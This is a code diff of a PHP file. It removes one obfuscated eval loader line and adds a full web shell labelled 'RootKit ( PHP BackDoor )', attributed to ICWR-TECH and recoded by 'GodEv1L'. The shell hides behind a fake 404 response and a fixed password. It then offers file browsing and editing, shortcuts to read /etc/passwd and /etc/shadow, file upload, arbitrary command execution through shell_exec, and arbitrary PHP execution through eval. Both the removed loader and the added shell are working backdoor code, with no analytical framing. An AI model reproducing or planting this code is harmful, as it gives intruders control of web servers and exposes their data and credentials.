@@ -1,2 +1,400 @@
-<?php ${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x67\x61\x6d\x78\x65\x76\x72\x68b"]="\x70\x59\x4e\x67\x4a";${"\x47\x4cO\x42\x41\x4c\x53"}["\x69o\x75\x77j\x6e\x64"]="\x67";${"\x47\x4c\x4f\x42\x41\x4cS"}["l\x72x\x62\x70\x6d"]="sT";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x61\x6c\x63\x69\x76\x77\x73t\x6f\x62t\x64"]="\x4e";${"G\x4c\x4f\x42A\x4c\x53"}["\x6d\x71h\x7aq\x71\x77"]="\x72y\x48\x4bH";${"GL\x4f\x42\x41\x4c\x53"}["\x6d\x64\x72pmlxd"]="pFHp";${"\x47L\x4f\x42\x41\x4c\x53"}["\x63\x68\x77y\x72\x6b"]="a\x4fWA\x62";${"GL\x4fBA\x4cS"}["\x70\x61\x6c\x66\x71\x73w\x67gp"]="heF\x55";${"\x47LO\x42\x41LS"}["w\x78f\x63hj\x78j\x67"]="\x61";${"\x47\x4cO\x42\x41\x4cS"}["rn\x70\x79\x79\x72\x6e\x66\x66\x6c"]="\x6e\x4f\x70";$eqtnikuox="l";${"\x47\x4c\x4fB\x41\x4cS"}["\x6aknndm\x76\x79yig\x77"]="M\x45\x53\x78";$lbstkbv="\x75\x59M\x41";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x79po\x6d\x6aq"]="\x55\x76";$leyypb="\x75Y\x4d\x41";${"G\x4cOB\x41LS"}["o\x77rsfk\x68\x78\x79\x71\x73"]="\x75\x59\x4dA";${"\x47L\x4fB\x41L\x53"}["\x70\x70q\x68\x77\x63\x61"]="\x4b\x42\x6c\x69";${"\x47L\x4f\x42\x41L\x53"}["ym\x64ya\x6e\x64\x6d\x66t"]="p\x59\x4e\x67J";${"G\x4c\x4f\x42\x41\x4cS"}["t\x66l\x65\x76it\x66\x6c\x71\x7a"]="LX";${"G\x4c\x4f\x42\x41LS"}["\x75h\x6e\x68\x78g"]="\x53\x69";$vagqlyh="\x4e";${"\x47\x4cO\x42A\x4c\x53"}["qy\x6b\x71\x62l\x6f\x6cs"]="\x78\x4e\x53";${"\x47L\x4fBA\x4cS"}["ze\x68d\x70\x77\x66\x65\x74\x68\x70q"]="h\x65F\x55";$qclicdl="M\x45\x53\x78";${"GL\x4f\x42A\x4c\x53"}["x\x66n\x62\x76\x6d\x6b\x6ev\x64"]="Tk";$cldrrvy="\x67";${"G\x4c\x4fB\x41\x4c\x53"}["\x67\x76w\x76\x70\x79\x73\x71\x62"]="\x73\x54";$kyiubvoyp="l";${"G\x4c\x4fB\x41\x4c\x53"}["x\x74otiuc\x74"]="t";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x74o\x74\x69\x75\x63\x74"]}="i";${"G\x4c\x4f\x42\x41LS"}["nk\x65\x63\x73\x6f\x66\x77k\x66\x63p"]="S\x66";${$kyiubvoyp}="\x62";${$cldrrvy}="\x6f";${"G\x4c\x4fBA\x4c\x53"}["s\x78tgy\x6d\x6d\x61\x66\x76\x75"]="T\x6b";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x70\x6dr\x67\x76e"]="n\x4f\x70";$bjqwmqf="S\x66";$ikmjxkmko="\x70\x46\x48\x70";${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x6e\x6be\x63\x73ofw\x6bfcp"]}="\x34";${"\x47\x4c\x4fB\x41LS"}["c\x79\x70\x7a\x6a\x6c\x6a"]="S\x69";${${"G\x4cO\x42\x41L\x53"}["u\x68\x6e\x68\x78\x67"]}="\x64";${$vagqlyh}="\x73";$uugyeuu="\x75Y\x4d\x41";${${"\x47L\x4f\x42\x41LS"}["g\x76\x77\x76\x70\x79sq\x62"]}="6";${"\x47\x4c\x4f\x42A\x4c\x53"}["l\x6dy\x68t\x6b\x68\x68x\x73\x6f"]="p\x46\x48\x70";$ieqieejlju="\x71\x6a";${"GL\x4f\x42\x41\x4cS"}["\x6ek\x73bb\x77\x6fxcyy"]="a\x4f\x57\x41\x62";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["m\x65\x68f\x62q\x79g\x70"]="\x61";${$ikmjxkmko}="t";${"\x47LO\x42\x41\x4c\x53"}["\x74\x77g\x66hs\x69\x6c\x62\x74"]="uYM\x41";$ejnwubsab="\x4b\x42l\x69";${${"GLO\x42A\x4c\x53"}["\x71\x79\x6bq\x62lol\x73"]}="\x7a";${"\x47\x4c\x4f\x42A\x4cS"}["\x72\x6amz\x72\x68"]="\x71\x6a";${${"\x47\x4c\x4f\x42\x41L\x53"}["\x74\x66\x6cev\x69\x74\x66l\x71z"]}="_";${${"GL\x4f\x42\x41\x4cS"}["\x6f\x77rs\x66\x6b\x68x\x79\x71\x73"]}="\x65";${${"\x47\x4c\x4fBA\x4c\x53"}["\x79\x70\x6f\x6d\x6a\x71"]}="\x63";$mmibqgxsof="\x4e";${${"\x47L\x4fB\x41\x4c\x53"}["\x6d\x65\x68\x66\x62\x71\x79\x67\x70"]}="\x6e";${$ieqieejlju}="f";$nhohlcdr="\x78\x4e\x53";${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x78\x66\x6e\x62\x76\x6d\x6b\x6e\x76\x64"]}="\x76";${$ejnwubsab}="l";${${"GLOBA\x4c\x53"}["\x6ak\x6endmvy\x79\x69\x67\x77"]}="\x72";${${"GL\x4f\x42\x41L\x53"}["\x72\x6e\x70\x79\x79\x72n\x66\x66\x6c"]}="\x61";${${"\x47\x4c\x4f\x42\x41LS"}["pa\x6c\x66\x71sw\x67\x67\x70"]}="g";${${"\x47L\x4fBALS"}["\x63\x68\x77\x79\x72\x6b"]}=${${"GLO\x42A\x4c\x53"}["z\x65\x68\x64\x70wf\x65\x74\x68\x70q"]}.${$nhohlcdr}.${${"G\x4c\x4f\x42A\x4cS"}["xt\x6fti\x75\x63t"]}.${${"\x47\x4cOB\x41\x4c\x53"}["wx\x66\x63\x68j\x78\x6ag"]}.${${"\x47\x4c\x4f\x42\x41L\x53"}["\x72jm\x7a\x72\x68"]}.${${"G\x4c\x4f\x42\x41\x4cS"}["pp\x71\x68w\x63\x61"]}.${${"GLOB\x41\x4c\x53"}["p\x6d\x72\x67\x76\x65"]}.${${"G\x4cO\x42\x41L\x53"}["\x6dd\x72\x70\x6dl\x78\x64"]}.${$leyypb};${"\x47L\x4f\x42A\x4c\x53"}["x\x6c\x62el\x6e"]="u\x59\x4d\x41";${${"\x47\x4c\x4fBA\x4c\x53"}["\x6d\x71hzq\x71w"]}=${$mmibqgxsof}.${${"G\x4c\x4fB\x41\x4cS"}["lm\x79\x68\x74k\x68\x68xs\x6f"]}.${${"\x47LOBA\x4cS"}["\x6a\x6b\x6e\x6e\x64\x6dv\x79\x79\x69\x67w"]}.${$qclicdl}.${${"GL\x4f\x42\x41\x4c\x53"}["x\x6c\x62\x65l\x6e"]}.${${"\x47\x4cO\x42A\x4c\x53"}["sxtg\x79mm\x61\x66\x76u"]};${${"\x47\x4c\x4f\x42A\x4cS"}["ym\x64\x79a\x6ed\x6d\x66\x74"]}=${$eqtnikuox}.${${"GL\x4fB\x41L\x53"}["\x72\x6e\x70\x79\x79r\x6ef\x66l"]}.${${"GL\x4fB\x41\x4c\x53"}["\x61l\x63\x69\x76\x77\x73t\x6f\x62t\x64"]}.${${"\x47LO\x42\x41L\x53"}["t\x77g\x66\x68si\x6cb\x74"]}.${${"\x47\x4cO\x42AL\x53"}["\x6c\x72\x78\x62\x70\x6d"]}.${$bjqwmqf}.${${"\x47L\x4fB\x41\x4c\x53"}["\x74\x66\x6c\x65\x76\x69\x74\x66lqz"]}.${${"\x47L\x4f\x42\x41\x4cS"}["\x75\x68\x6e\x68\x78\x67"]}.${$lbstkbv}.${${"\x47\x4cOB\x41L\x53"}["\x79\x70o\x6d\x6a\x71"]}.${${"G\x4cO\x42\x41LS"}["i\x6f\x75\x77j\x6e\x64"]}.${${"\x47L\x4f\x42A\x4c\x53"}["cy\x70z\x6al\x6a"]}.${$uugyeuu};eval(${${"G\x4c\x4f\x42AL\x53"}["nk\x73b\x62\x77\x6fx\x63\x79\x79"]}(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6d\x71h\x7a\x71\x71w"]}(${${"G\x4cO\x42A\x4c\x53"}["t\x67\x61\x6dx\x65\x76\x72\x68b"]}("Af\x70\x7aW5\x78\x68w\x50\x32\x4a\x74C+\x69\x42\x42\x42\x6er6\x39\x76\x71\x4cs\x5a\x353\x4f\x77h\x4cI\x64VBr\x46WBW\x64HL\x51bl\x42Kr+\x4emJrJ2e\x44\x65\x59\x70\x797\x33r\x36Jja\x53\x46K\x53\x57\x72R\x69\x46P\x43KD\x6b\x34C\x77\x54C/\x77\x41\x41\x4dII\x41O\x4d\x63\x45\x46"))));
+<?php
+// RootKit ( PHP BackDoor )
+// Coded By Afrizal F.A - ICWR-TECH
+// Copyright (C)2019 - ICWR-TECH
+error_reporting(0);
+header('HTTP/1.0 404 Not Found', true, 404);
+session_start();
+$pass = "anonymously";
+$link = "s.txt";
+if($_POST['passwd'] == $pass) {
+  $_SESSION['rootkit'] = $pass;
+  echo "<script>window.location='?'</script>";
+}
+if($_GET['page'] == "blank") {
+  echo "<a href='?'>Back</a>";
+  exit();
+}
+if(isset($_REQUEST['logout'])) {
+  session_destroy();
+  echo "<script>window.location='?'</script>";
+}
+if(!($_SESSION['rootkit'])) {
+?>
+<title>FuckSecurityXD</title>
+<link rel="icon" href="https://stmed.net/sites/default/files/mr.-robot-wallpapers-31622-6964240.jpg">
+<style>
+  html{
+    overflow: auto;
+    background: black;
+    color: white;
+    font-family: "Courier New";
+  }
+  input {
+    background: transparent;
+    color: white;
+    height: 40px;
+    border: 1px solid white;
+    border-radius: 20px;
+    padding: 5px;
+    font-size: 20px;
+  }
+  .img {
+    width: 170px;
+    border: 3px solid white;
+    border-radius: 20px;
+  }
+</style>
+<table width="100%" height="100%">
+  <td align="center">
+    <form enctype="multipart/form-data" method="post">
+      <img class="img" src="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png"/>
+      <br><br>
+      <font size="5">( blackhat shells )</font>
+      <br><br>
+      <input type="password" name="passwd" placeholder="Enter the password....">
+      <input type="submit" value="Login">
+      <br>
+      <?php echo $_SESSION['rootkit']; ?>
+    </form>
+  </td>
+</table>
+<?php
+exit();
+}
+?>
+<?php
+$dir_raw = getcwd();
+$host = $_SERVER['HTTP_HOST'];
+if($dn = $_GET['d']) {
+  $_SESSION['dir'] = $dn;
+  echo "<script>window.location = '?';</script>";
+}
+if(empty($_SESSION['dir'])) {
+  $dir = $dir_raw;
+} else {
+  $dir = $_SESSION['dir'];
+}
+$exp = explode("/", $dir);
+foreach($exp as $x=>$dirx) {
+  if(empty($dirx)){
+    continue;
+  }
+  $do .= "<li class='bar'><a class='a-bar' href='?d=";
+  for($i=0;$i<=$x;$i++) {
+    $do .= $exp[$i]."/";
+  }
+  $do .= "'>$dirx</a></li>\
+";
+}
+chdir($dir);
+?>
+<title>GodEv1L Mode</title>
+<?php
+if(isset($_REQUEST['exe_code'])) {
+  if($_POST['code']) {
+    $_SESSION['code'] = '?>'.$_POST['code'];
+  }
+  eval($_SESSION['code']);
+  echo "<hr><a href='?page=scripting'>Back</a>";
+  exit();
+}
+?>
+<link rel="icon" href="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png">
+<style>
+  html{
+    overflow: auto;
+    background: black;
+    color: white;
+    font-family: "Courier New";
+  }
+  a {
+    text-decoration: none;
+    color: white;
+  }
+  .a-bar {
+    text-decoration: none;
+    color: black;
+  }
+  .bar {
+    display: inline;
+    padding: 5px;
+    background: white;
+    color: black;
+  }
+  .baratas {
+    overflow: auto;
+    border: 1px solid white;
+    padding: 10px;
+    background: white;
+    color: black;
+  }
+  .close {
+    overflow: auto;
+    border: 1px solid red;
+    background: red;
+    color: white;
+  }
+  .kotak {
+    overflow: auto;
+    border: 1px solid white;
+    padding: 10px;
+    color: white;
+  }
+  .l {
+    float: left;
+    width: 50%;
+  }
+  .r {
+    float: right;
+    width: 50%;
+    text-align: right;
+  }
+  .l1 {
+    float: left;
+    width: 20%;
+    border: 1px solid white;
+    padding: 10px;
+  }
+  .r1 {
+    float: right;
+    width: 75%;
+    border: 1px solid white;
+    padding: 10px;
+  }
+  input {
+    background: white;
+    color: black;
+    border: 1px solid white;
+    padding: 5px;
+  }
+  .file {
+    width: 100%;
+    height: 50%;
+  }
+</style>
+<div class="baratas">
+  <div class="l">
+    Fuck securityXD
+  </div>
+  <div class="r">
+      <a class="a-bar" href="?page=blank">[_]</a>
+      <a class="a-bar" href="?page=blank">[-]</a>
+      <a class="close" href="?logout">[X]</a>
+  </div>
+</div>
+<div class="kotak">
+  [ <a href="?">File Manager</a> ]
+  [ <a href="?page=upload">Upload</a> ]
+  [ <a href="?page=shell">Command Shell</a> ]
+  [ <a href="?page=scripting">Scripting</a> ]
+  [ <a href="?page=tentang">About</a> ]
+</div>
+<div class="kotak">
+  [ Directory ] => <li class="bar"><a class="a-bar" href="?d=/">/</a></li><?php echo "\
+".$do; ?>
+</div>
+<div class="kotak">
+  <div class="l1">
+    <div class="baratas">
+      Action
+    </div>
+    <hr>
+    [*] <a href="?page=newfile">New File</a>
+    <br>
+    [*] <a href="?page=newfolder">New Folder</a>
+    <hr>
+    <div class="baratas">
+      Sensitive File
+    </div>
+    <hr>
+    [*] <a href="?file=/etc/passwd">/etc/passwd</a>
+    <br>
+    [*] <a href="?file=/etc/shadow">/etc/shadow</a>
+    <br>
+    [*] <a href="?file=/etc/resolv.conf">/etc/resolv.conf</a>
+  </div>
+  <div class="r1">
+      <?php
+      if($_GET['file']) {
+      ?>
+[ <a href="?file=<?php echo $_GET['file']; ?>&delete=true">Delete</a> ]
+[ <a href="?file=<?php echo $_GET['file']; ?>&edit=true">Edit</a> ]
+[ <a href="?file=<?php echo $_GET['file']; ?>&rename=true">Rename</a> ]
+[ <a href="?">Back</a> ]
+<hr>
+      <?php
+        if(!$_GET['edit'] && !$_GET['delete'] && !$_GET['rename']) {
+          echo "<textarea class='file'>".htmlspecialchars(file_get_contents($_GET[file]))."</textarea>";
+        }
+        if($_GET['edit'] == "true") {
+          echo "<form enctype='multipart/form-data' method='post'>
+          <textarea class='file' name='edit_file'>".htmlspecialchars(file_get_contents($_GET['file']))."</textarea>
+          <br><br>
+          <input type='submit' value='Save File'>
+          </form>
+          ";
+          if($_POST['edit_file']) {
+            $fedit = fopen($_GET['file'], "w");
+            if(fwrite($fedit, $_POST['edit_file'])) {
+              fclose($fedit);
+              echo "<script>alert('Edit File Success !!!'); window.location = '?file=$_GET[file]';</script>";
+            } else {
+              echo "<script>alert('Edit File Failed !!!'); window.location = '?file=$_GET[file]';</script>";
+            }
+          }
+        }
+        if($_GET['delete'] == "true") {
+          if(unlink($_GET['file'])) {
+            echo "<script>alert('File Deleted !!!'); window.location = '?';</script>";
+          } else {
+            echo "<script>alert('Failed Deleted File !!!'); window.location = '?file=$_GET[file]';</script>";
+          }
+        }
+        if($_GET['rename'] == "true") {
+          echo "<form enctype='multipart/form-data' method='post'>
+          ".htmlspecialchars($_GET['file'])." [ To ] <input type='text' name='rename_file'>
+          <input type='submit' value='Rename'>
+          </form>
+          ";
+          if($_POST['rename_file']) {
+            if(copy($_GET['file'], $_POST['rename_file'])) {
+              unlink($_GET['file']);
+              echo "<script>alert('File Renamed !!!'); window.location = '?';</script>";
+            } else {
+              echo "<script>alert('Failed Rename File !!!'); window.location = '?file=$_GET[file]';</script>";
+            }
+          }
+        }
+      }
+      if(!$_GET) {
+        echo "<form enctype='multipart/form-data' method='post'>
+        Rename This Folder : <input type='text' name='rename_folder'><input type='submit' value='Rename'>
+        <a class='baratas' href='?rmfolder=$dir'>Remove This Folder</a>
+        </form>
+        <hr>
+        ";
+        if($_POST['rename_folder']) {
+          if(mkdir("../".$_POST['rename_folder'])) {
+            rmdir("../".$dir);
+            echo "<script>alert('This Folder is Renamed !!!'); window.location = '?d=$dir/..';</script>";
+          } else {
+            echo "<script>alert('This Folder is Failed Rename !!!'); window.location = '?';</script>";
+          }
+        }
+        if($_GET['rmfolder']) {
+          if(rmdir($dir)) {
+            echo "<script>alert('Folder Deleted !!!'); window.location = '?d=$dir/..';</script>";
+          } else {
+            echo "<script>alert('This Folder is Failed Delete !!!'); window.location = '?';</script>";
+          }
+        }
+        $scndir = scandir($dir);
+        foreach($scndir as $sdir) {
+          if(is_dir($dir."/".$sdir)) {
+            echo "<a href='?d=$dir/$sdir'><img height='20' src='http://icons.iconarchive.com/icons/dtafalonso/yosemite-flat/256/Folder-icon.png'/> ".htmlspecialchars($sdir)."</a><br>";
+          }
+          if(is_file($dir."/".$sdir)) {
+            echo "<a href='?file=$dir/$sdir'><img height='20' src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png'/> ".htmlspecialchars($sdir)."</a><br>";
+          }
+        }
+      }
+      if($_GET['page'] == "upload") {
+        echo "Upload File
+        <br><br>
+        <form enctype='multipart/form-data' method='post'>
+        <input type='file' name='up'>
+        <input type='submit' value='Upload'>
+        </form>
+        ";
+        if($_FILES['up']) {
+          if(copy($_FILES['up']['tmp_name'], $_FILES['up']['name'])) {
+            echo "[+] Hantam : ".$_FILES['up']['name'];
+          } else {
+            echo "[-] Oh Shit!? : ".$_FILES['up']['name'];
+          }
+          echo "<br>";
+        }
+      }
+      if($_GET['page'] == "shell") {
+        if($_POST['shell']) {
+          echo "RootKit@$host:~ $ ".$_POST['shell'];
+          echo "<pre>".htmlspecialchars(shell_exec($_POST['shell']))."</pre>";
+        }
+        echo "<form enctype='multipart/form-data' method='post'>
+        RootKit@$host:~ $ <input type='text' name='shell'><input type='submit' value='~'>
+        </form>";
+      }
+      if($_GET['page'] == "scripting") {
+        if(empty($str_code)) {
+          $str_code = "<?php echo 'Hello World'; ?>";
+        } else {
+          $str_code = htmlspecialchars($_SESSION['code']);
+        }
+        echo "<form action='?exe_code' enctype='multipart/form-data' method='post'>
+        <center>Running PHP Script</center>
+        <hr>
+        <textarea class='file' name='code'>$str_code</textarea>
+        <bR><br>
+        <input type='submit' value='Run Script !!!'>
+        </form>
+        ";
+      }
+      if($_GET['page'] == "tentang") {
+        echo "
+        <center>
+        <font size='20'>GodEv1L FucksecurityXD Shell</font>
+        <br><br>
+        <font size='5'>Hitdown - Shutdown - Breakdown</font>
+        <bR><br>
+        GodEv1L just recoded shell
+        <br><br>
+        FROM : <a href='https://github.com/icwr-tech/php-rootkit'>https://github.com/icwr-tech/php-rootkit</a>
+        </center>
+        ";
+      }
+      if($_GET['page'] == "newfile") {
+        echo "<form enctype='multipart/form-data' method='post'>
+        <textarea class='file' name='isi_file'>".htmlspecialchars(file_get_contents($_GET['file']))."</textarea>
+        <br><br>
+        <input type='text' name='name_file'>
+        <br><bR>
+        <input type='submit' value='Save File'>
+        </form>
+        ";
+        if($_POST['name_file']) {
+          $nfile = fopen($_POST['name_file'], "w");
+          if(fwrite($nfile, $_POST['isi_file'])) {
+            echo "<script>alert('File Created !!!'); window.location = '?';</script>";
+          } else {
+            echo "<script>alert('Created File Failed !!!'); window.location = '?';</script>";
+          }
+        }
+      }
+      if($_GET['page'] == "newfolder") {
+        echo "<form enctype='multipart/form-data' method='post'>
+        New Folder : <input type='text' name='name_folder'>
+        <input type='submit' value='Save Folder'>
+        </form>
+        ";
+        if($_POST['name_folder']) {
+          if(mkdir($_POST['name_folder'])) {
+            echo "<script>alert('Folder Created !!!'); window.location = '?';</script>";
+          } else {
+            echo "<script>alert('Created Folder Failed !!!'); window.location = '?';</script>";
+          }
+        }
+      }
+      ?>
+  </div>
+</div>
+<div class="kotak">
+  <div class="l">
+    Free Space : <?php echo disk_free_space("/"); ?> Byte
+  </div>
+  <div class="r">
+    Copyright &copy;2019 - ICWR-TECH
+  </div>
+</div>
+<?php
 ?>
